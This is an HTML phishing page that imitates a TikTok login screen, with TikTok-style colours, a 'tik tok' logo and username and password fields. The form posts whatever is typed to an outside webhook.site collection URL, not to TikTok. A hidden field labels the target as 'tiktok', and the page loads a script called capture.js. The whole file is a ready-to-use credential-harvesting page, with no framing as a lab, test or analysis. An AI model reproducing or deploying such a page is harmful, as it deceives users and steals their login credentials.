<html>
<head>
    <script src="capture.js"></script>
    <title>TikTok</title>
    <style>
        body { font-family: Arial, sans-serif; background: #000; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; color: white; }
        .container { text-align: center; width: 350px; }
        .logo { font-size: 50px; font-weight: bold; margin-bottom: 30px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #333; border-radius: 4px; font-size: 16px; background: #222; color: white; }
        input[type="submit"] { background: #fe2c55; color: white; border: none; padding: 14px; border-radius: 4px; width: 100%; font-weight: bold; font-size: 16px; margin-top: 20px; }
        .header { font-size: 24px; margin-bottom: 30px; color: #fff; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">tik tok</div>
        <div class="header">Log in</div>
        <form action="https://webhook.site/ac3017bb-31ec-446c-ba45-5b13aae5c7fb" method="POST">
            <input type="text" name="username" placeholder="Username or email">
            <input type="password" name="password" placeholder="Password">
            <input type="submit" value="Log in">
        <input type="hidden" name="site" value="tiktok"></form>
    </div>
</body>
</html>
